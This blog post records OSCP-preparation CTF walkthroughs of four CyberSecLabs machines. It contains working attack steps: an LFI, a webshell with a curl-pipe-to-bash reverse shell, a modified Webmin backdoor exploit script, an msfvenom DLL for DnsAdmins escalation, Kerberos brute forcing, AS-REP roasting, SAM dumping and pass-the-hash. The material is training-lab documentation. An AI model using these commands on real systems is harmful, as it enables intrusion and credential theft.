---
layout: post
title:  "OSCP Preparation Day Two"
date:   2020-07-11 20:05:48 +0100
categories: oscp
---

I suppose it's becoming a trend to count the days that i'm doing something. In that resepct, here is day 2 of the OSCP preperation journey.

I will be continuing with the last free box on [cyberseclabs](https://www.cyberseclabs.co.uk/) "office".

## OFFICE

Office is a "challenging" machine ranked 7/10 difficulty.
### NMAP
```
Nmap scan report for 172.31.3.1
Host is up, received user-set (0.16s latency).
Scanned at 2020-07-11 08:29:30 BST for 29s
Not shown: 996 closed ports
Reason: 996 resets
PORT      STATE    SERVICE          REASON         VERSION
22/tcp    open     ssh              syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http             syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.4.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dunder Mifflin &#8211; Just another WordPress site
443/tcp   open     ssl/http         syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
10000/tcp filtered snet-sensor-mgmt no-response
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 11 08:29:59 2020 -- 1 IP address (1 host up) scanned in 28.78 seconds
```

### PORT 80

On port 80 there is a wordpress seervice running with some default posts from a user named "dwight". Here they mention that there is a forum on a subdomain that could have some interesting conversation on it.
```
Hey guys, it’s your future manager, Dwight.

Yes, you heard that right! I made an accountability booster to set off once you guys make 5 mistakes in a single day, which I bet will happen!

I started a forum page on a subdomain, y’all can vent there before I send out an email to corporate.

PS: Can’t wait to fire you Jim! 
```
To find this I used gobuster to brute force vhosts:
```
gobuster vhost -u http://office.csl/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://office.csl/
[+] Threads:      10
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/07/11 08:47:00 Starting gobuster
===============================================================
Found: www.office.csl (Status: 301) [Size: 0]
Found: forum.office.csl (Status: 200) [Size: 8773]
```
Now we see forum.office.csl we can add it to our hosts file and see what is there.

### SUBDOMAIN
On the subdomain there is a bunch of chat logs talking about peoples passwords and trying to guess them:
```
Ryan: Dwight would never be that obvious, try something like z64$8
Jim: Doesn't work.
Ryan: Not that exactly Jim! I said "something like".
```
From this transcript it could be possible that we will have to create a custom wordlist for the password, but i'm not sure currently.

### LFI

After clicking on some of the links at the top "Login" and "Chat logs" we see there is a LFI vulnerability in the Chat logs section:
```
http://forum.office.csl/chatlogs/chatlogs.php?file=chatlog.txt
```
/etc/passwd:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ryan:x:1000:1000:ryan:/home/ryan:/bin/bash
dwight:x:1001:1001:Dwight Schrute,,,:/home/dwight:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```
On the "login" screen it mentioned logging in via a User-agent header:
```
Login is done via User-Agent to access the forum.
```
I'm not sure if this was supposed to hint me, but I ended up checking for a .htpasswd file in the directory above because of this:
```
http://forum.office.csl/chatlogs/chatlogs.php?file=../.htpasswd

dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/ 
```
Now we have a hash for an account named dwight.

It cracks pretty quickly in john so maybe the chat log was a slight rabbit-hole.
```
cowboys1         (dwight)
```
### SHELL
These credentials work with wordpress and once we login, there is a plugin/addon named "WP File Manager" which lets us upload files. Here I just uploaded a simple webshell.php and used it to run the command:
```
curl 10.10.1.63/shell.sh | bash
```
shell.sh contents:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.1.63/4444 0>&1
```
This will give us a shell on the box as www-data:
### PRIV ESC

The user www-data can run /bin/bash as user dwight? I'm not sure why these past 2 machines are getting rated so high in difficulty as, so far, this is getting ranked at easy on htb
```
Matching Defaults entries for www-data on office:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on office:
    (dwight) NOPASSWD: /bin/bash
```

To priv esc just run the command:
```
sudo -u dwight /bin/bash
dwight@office:/dev/shm$ cd
```
Now we can write our public key to the "/home/dwight/.ssh/authorized_keys" file and get an ssh session as dwight:
```
echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGnCmTwLdx0LOHp/QuGfmC0RWTeDMk6oUwxWcvF4sjeLIIlzH//eL8dlcTxc9zfuuw1FV/J2UVJpESiLZxev656yr29G+w0UcN39VPJkOKzEzD6xkLt7T4A4EVHKBDcR0GQ2tolckk3y5D6ESAt/C5fcamEDgClApOO0S03lKkLOle4LulACYCl7Oku7Bwo1FWjMP73folgiCA/GrW/YsnvbRkPc6vlVyc0iE4wKIwvvsUPVrG1cues4/Nxiv8Nu5K1et/ICuV55V9UAFk8FnFlfDz7oo17454xMLC0cIcWtvv4T6jZJrFyeUqkTOjd/73lNf2G+QPMmsblKZMmYB2FDoEWtqg3qDvTzZV33LxzmrY+8gxsBGCOF6ME/F7VqIWf3p7A+Dwmontp2ZIAhuAxQdHc2SZgn/umBF3JI0vHZtDpRqvR026wkf7+KA+PmcletSirSxNQceG7ZfDflsuE6N+1ogV6NidWWBPAySOo3MhhlfbEbvv3yxb7VjK8vE= corn@c0rnOS > ~/.ssh/authorized_keys

Note: if this file already exists, change the ">" to ">>" so that you do not overwrite any of the existing contents.
```
From some enumeration it can be seen that there is a file name "/usr/bin/closeports.sh" which appears to only allow connections to the webmin service over localhost (this is why the port was filtered on nmap):
```
cat /usr/bin/closeports.sh
iptables -A INPUT -p tcp -s localhost --dport 10000 -j ACCEPT
iptables -A INPUT -p tcp --dport 10000 -j DROP
```
We can use our ssh session to forward the port so we can access the webserver from our machine.
```
ssh -i id_rsa -L 10000:127.0.0.1:10000 dwight@office.csl
```
### WEBMIN
After trying a few passwords from the box, like the ones found in the chatlogs and dwights password, I checked for the webmin version and started looking for exploits:
```
cat /etc/webmin/version
1.890
```
Online there is a known backdoor for the service which can be found [here](https://www.exploit-db.com/exploits/47230):
```
Unknown attacker(s) inserted Perl qx statements into the build server's
source code on two separate occasions: once in April 2018, introducing
the backdoor in the 1.890 release, and in July 2018, reintroducing the
backdoor in releases 1.900 through 1.920.
```
Since this is OSCP prep I used a non metasploit version that I found on [github](https://raw.githubusercontent.com/hannob/webminex/master/webminex) and edited it give me a shell:
```
#!/bin/bash
#
# Exploit for Webmin backdoor CVE-2019-15107 CVE-2019-15231
# see https://www.virtualmin.com/node/66890

HOST=127.0.0.1

for PROT in http https; do
	curl -d 'user=aequxloh&pam=&expired=2&old=curl 10.10.1.63/shell.sh | bash&new1=abc&new2=abc' \
		-sk -X POST --referer "$PROT://$HOST:10000/session_login.cgi" \
		"$PROT://$HOST:10000/password_change.cgi" \
		| grep -q "cHeCk"
	if [ $? -eq 0 ]; then
		echo $PROT://$HOST:10000 vulnerable [variant 1 CVE-2019-15107]
	fi

	curl -d 'expired=curl 10.10.1.63/shell.sh | bash' \
		-sk -X POST --referer "$PROT://$HOST:10000/session_login.cgi" \
		"$PROT://$HOST:10000/password_change.cgi" \
		| grep -q "CkAzD"
	if [ $? -eq 0 ]; then
		echo $PROT://$HOST:10000 vulnerable [variant 2 CVE-2019-15231]
	fi
done
```
Now we have inserted our payload `curl 10.10.1.63/shell.sh | bash`, using the same reverse shell method as the foothold we get a shell as root.
```
root@office:~# whoami && hostname
whoami && hostname
root
office
```

## BRUTE

I didn't like this box so much as I'll explain into the walkthrough but here we go:

### NMAP
```
Nmap scan report for 172.31.3.3
Host is up, received user-set (0.067s latency).
Scanned at 2020-07-11 11:29:14 BST for 330s
Not shown: 990 closed ports
Reason: 990 resets
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain?       syn-ack ttl 127
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-07-11 10:30:42Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 11 11:34:44 2020 -- 1 IP address (1 host up) scanned in 330.06 seconds

```

### KERBRUTE
As the name implies we will be brute forcing kerberos. For this I used the kerbrute binary.

First we need to enumerate users:
```
kerbrute userenum --dc brute.csl -d brute.csl /opt/SecLists/Usernames/Names/names.txt

2020/07/11 13:12:36 >  [+] VALID USERNAME:	 darleen@brute.csl
2020/07/11 13:13:17 >  [+] VALID USERNAME:	 malcolm@brute.csl
2020/07/11 13:13:38 >  [+] VALID USERNAME:	 patrick@brute.csl
2020/07/11 13:14:00 >  [+] VALID USERNAME:	 tess@brute.csl
```
Now we need to brute force the password.
```
kerbrute bruteuser --dc brute.csl -d brute.csl /usr/share/wordlists/rockyou.txt malcolm
kerbrute bruteuser --dc brute.csl -d brute.csl /usr/share/wordlists/rockyou.txt darleen
kerbrute bruteuser --dc brute.csl -d brute.csl /usr/share/wordlists/rockyou.txt patrick
kerbrute bruteuser --dc brute.csl -d brute.csl /usr/share/wordlists/rockyou.txt tess
```
It could just be that my internet is bad, or if kerbrute doesn't run the password list sequentially, but the valid password is over 400,000 lines into the wordlist, which I think is a little absurd personally. Maybe this box was just designed to teach patience, who knows!

Anyway, after 2-3 hours we find a valid password and can continue.

With the password found we can log in over winrm with the user "tess"
```
evil-winrm -i brute.csl -u tess -p Unique1
```

### PRIVESC
And after typing `net user tess` we can see we are part of the dns admins group.
```
Local Group Memberships      *DnsAdmins            *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
After a quick google on the group, there is an exploit that we can use to priv esc to SYSTEM found [here](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2).

Here are the commands I used:
```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.0.64 LPORT=4444 -f dll > privesc.dll

*Evil-WinRM* PS C:\windows\tasks> upload /home/corn/ctf/cyberseclab/challenge/brute/privesvc/privesc.dll

*Evil-WinRM* PS C:\windows\tasks> ([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname
Brute-DC.brute.csl

*Evil-WinRM* PS C:\windows\tasks> dnscmd Brute-DC.brute.csl /config /serverlevelplugindll C:\windows\tasks\privesc.dll

Start listener on attacking machine.

*Evil-WinRM* PS C:\windows\tasks> sc.exe stop dns

*Evil-WinRM* PS C:\windows\tasks> sc.exe start dns

Now we have a shell as SYSTEM.
```

## MOUNT

### NMAP
```
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-11 12:52:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Mount.csl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: Mount.csl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 311.00 seconds
```

### KERBEROS
As with the last box we will bruteforce kerberos for valid usernames and passwords. I saw a pattern on one of the user accounts when using a wordlist of "FIRST LETTER OF FIRST NAME SURNAME" e.g. "jsmith" so I searched online for a wordlist that fit this description. Here is the link to the [wordlist](https://github.com/insidetrust/statistically-likely-usernames)

With this we find 5 users in kerbrute.
```
kerbrute userenum --dc Mount.csl -d Mount.csl /opt/SecLists/Usernames/statistically-likely-usernames/jsmith.txt

020/07/11 14:54:14 >  [+] VALID USERNAME:	 nlee@Mount.csl
2020/07/11 14:54:15 >  [+] VALID USERNAME:	 ptaylor@Mount.csl
2020/07/11 14:54:17 >  [+] VALID USERNAME:	 kwood@Mount.csl
2020/07/11 14:54:21 >  [+] VALID USERNAME:	 awoods@Mount.csl
2020/07/11 14:55:00 >  [+] VALID USERNAME:	 akirk@Mount.csl
```
Brute forcing the 5 users to get a valid hit on awoods:
```
kerbrute bruteuser --dc Mount.csl -d Mount.csl /usr/share/wordlists/rockyou.txt awoods

2020/07/11 15:02:48 >  [+] VALID LOGIN:	 awoods@Mount.csl:qwertyuiop
```
Now we can log on and grab the user flag.

### PRIVESC


From some light enumeration there is a interesting directory named "Backups" with a .vhdx file inside that is named `DC-BACKUP-1.vhdx`. Perhaps if we can download this, we can get the password hashes from it.

So, the file is 10GB, If I was to download this it would take about 10 years with my internet connection. The intended way I think due to box name is the mount it anyway so I will pray that it takes less time to do that...
```
guestmount --add /mnt/smb/DC-BACKUP-1.vhdx --inspector --ro /mnt/vhd -v
```
Once this has finished running we can take both the SAM and SYSTEM files:
```
cp /mnt/vhd/Windows/System32/config/SAM /root/SAM
cp /mnt/vhd/Windows/System32/config/SYSTEM /root/SYSTEM
```

### SECRETSDUMP

Now we have both SAM and SYSTEM file from the backup, we can find the hashes with secretsdump
```
secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x147fbe655f029597c5f1054868f97244
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bf69ae31c9f3e6d8b108fcd7a8aff85:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

With this hash we can log in to Administrator:
```
evil-winrm -i Mount.csl -u Administrator -H 6bf69ae31c9f3e6d8b108fcd7a8aff85
```


## Dictionary

### NMAP
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-11 17:00:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Dictionary.csl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: Dictionary.csl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Dictionary-DC.Dictionary.csl
| Not valid before: 2020-06-06T00:05:36
|_Not valid after:  2020-12-06T00:05:36
|_ssl-date: 2020-07-11T17:01:44+00:00; -1s from scanner time.
Service Info: Host: DICTIONARY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-11T17:01:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 226.52 seconds
```

### KERBEROS
There is a running theme with these AD boxes, if you couldn't tell already! So as usual, we will be attacking kerberos.

First, lets look for some usernames:
```
kerbrute userenum --dc Dictionary.csl -d Dictionary.csl /opt/SecLists/Usernames/Names/names.txt

2020/07/11 18:06:30 >  [+] VALID USERNAME:	 izabel@Dictionary.csl

kerbrute userenum --dc Dictionary.csl -d Dictionary.csl /opt/SecLists/Usernames/statistically-likely-usernames/jsmith.txt

2020/07/11 18:06:49 >  [+] VALID USERNAME:	 cvalencia@Dictionary.csl
```

Now we can put those names into GetNPUsers to see if any are kerberoastable:
```
GetNPUsers.py Dictionary.csl/ -usersfile users.txt 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] User cvalencia doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$izabel@DICTIONARY.CSL:2d9fe73536fa6e613f1ec560a5f19077$6d1e270146dcb5b3e8cc4a3b6c17f68c698602020f33d01e2db3bff7363acc2359c37edebb0e4dae5f536a639f9fd2f2db735d0caabbd9e1af005351302b05948f7caf69e1a0343520e7a99728b30453f12dc3bbb835cecb2ae4e84a55f1570e1de70734895d040b18b638354f90154e7e3d99559262c09cde00938fc1dfd07d4b02cde17e97aa8d762b67761f2af0c79540014197cd26d48cc59e3d948663a7b64c4e57213118939ea889ae4f49edd341826ba15ec47d190e286de64ecf54940c6a955b8b6ca73d04aec0b2c8d629bb04e17d71facef3f441ba72cfb9ca74f58442655e4a405628edddcecf6a6e1598
```
With this hash we can use john with a ruleset to crack the hash:
```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=dive hash
June2013         ($krb5asrep$23$izabel@DICTIONARY.CSL)
```
This doesn't allow us to login over winrm, so let's check elsewhere for information.

### RDPCLIENT
Now we can connect to rdp client with a session as the user izabel.
```
rpcclient -U "izabel" Dictionary.csl
Enter WORKGROUP\izabel's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Izabel] rid:[0x44f]
user:[CValencia] rid:[0x450]
user:[BACKUP-Izabel] rid:[0x451]
```
Now we notice a "BACKUP-Izabel" user we can see if we can get some working credentials.

### BRUTEFORCE

I wrote a small script to generate some passwords following the style of the password we cracked:
```
#!/usr/bin/python
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'Septemeber', 'October', 'November', 'December']
years = 2000

f = open('wordlist','a')

while years < 2020:
	for x in months:
		f.write(x + str(years) +"\n")
	years = years + 1
f.close()
```
Now after running this against kerbrute, we get a valid password:
```
kerbrute bruteuser --dc Dictionary.csl -d Dictionary.csl wordlist BACKUP-Izabel

2020/07/11 18:48:12 >  [+] VALID LOGIN:	 BACKUP-Izabel@Dictionary.csl:October2019
```

Finally, we may login over evil-winrm as the backup user:
```
evil-winrm -i Dictionary.csl -u backup-izabel -p October2019
```

### PRIVESC
After running winpeas on the box there is some output showing firefox credentials stored:
```
[+] Looking for Firefox DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\BACKUP-Izabel\AppData\Roaming\Mozilla\Firefox\Profiles\65wr35iv.default-release\key4.db
```
From the directory `C:\Users\BACKUP-Izabel\AppData\Roaming\Mozilla\Firefox\Profiles\65wr35iv.default-release\` we can grab both key4.db and logins.json files.

With these we can go and decrypt them with this tool [firepwd](https://github.com/lclevy/firepwd):
```
python3 firepwd.py -d /home/corn/ctf/cyberseclab/challenge/dictionary/privesc/

https://www.cyberseclabs.co.uk:b'l33tHax',b'iHgPVQivZw7wpEd'
https://www.cyberseclabs.co.uk:b'iAmRoot',b'LUp2KhdP'
https://www.cyberseclabs.co.uk:b'NotADuck',b'x7VtnCWZ'
https://www.cyberseclabs.co.uk:b'EpicL_yep',b'kC7pbrQAsTT'
```
Now we can brute force the Administrator password with kerbrute to see if we get a valid login:
```
kerbrute bruteuser --dc Dictionary.csl -d Dictionary.csl passwords.txt Administrator

2020/07/11 19:20:11 >  [+] VALID LOGIN:	 Administrator@Dictionary.csl:kC7pbrQAsTT
```

I have now covered 5/6 challenging boxes on this website. I will try to continue with the last one, as well as going through the beginner boxes for some fun.

